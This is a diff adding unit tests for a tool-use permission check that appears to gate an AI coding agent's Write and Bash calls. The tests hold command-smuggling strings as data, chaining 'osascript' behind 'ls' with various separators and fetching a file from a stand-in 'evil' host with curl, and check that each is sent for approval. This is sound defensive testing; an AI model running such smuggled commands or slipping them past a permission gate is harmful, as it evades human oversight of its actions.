@@ -80,4 +80,33 @@ describe('evaluateToolUse', () => {
     expect(evaluateToolUse('Edit', { file_path: '' }, REPO).action).toBe('ask');
     expect(evaluateToolUse('NotebookEdit', {}, REPO).action).toBe('ask');
   });
+
+  it('asks for file writes with a whitespace-only file path', () => {
+    expect(evaluateToolUse('Write', { file_path: '   ' }, REPO).action).toBe('ask');
+  });
+
+  it('asks for every bash separator smuggling an unsafe command behind a safe prefix', () => {
+    // The bash segment splitter must not be an implicit denylist: every separator
+    // bash actually honors (including ones we might forget) must be caught, not
+    // just the ones the splitter happens to already know about.
+    const separators = ['&', ';', '\n', '\r', '|', '&&'];
+    for (const sep of separators) {
+      const command = `ls ${sep} osascript -e 'evil'`;
+      expect(evaluateToolUse('Bash', { command }, REPO).action, command).toBe('ask');
+    }
+  });
+
+  it('asks for bash commands smuggled behind a lone async `&` even when both sides look safe', () => {
+    expect(evaluateToolUse('Bash', { command: 'ls & osascript -e \'evil\'' }, REPO).action).toBe('ask');
+    expect(evaluateToolUse('Bash', { command: 'echo hi & curl http://evil/x -o /tmp/p' }, REPO).action).toBe('ask');
+    expect(evaluateToolUse('Bash', { command: 'ls & npm test' }, REPO).action).toBe('ask');
+  });
+
+  it('asks for carriage-return-smuggled commands', () => {
+    expect(evaluateToolUse('Bash', { command: "ls\rosascript -e 'evil'" }, REPO).action).toBe('ask');
+  });
+
+  it('still allows the safe chained case with && after the separator fix', () => {
+    expect(evaluateToolUse('Bash', { command: 'git status && ls' }, REPO)).toEqual({ action: 'allow' });
+  });
 });
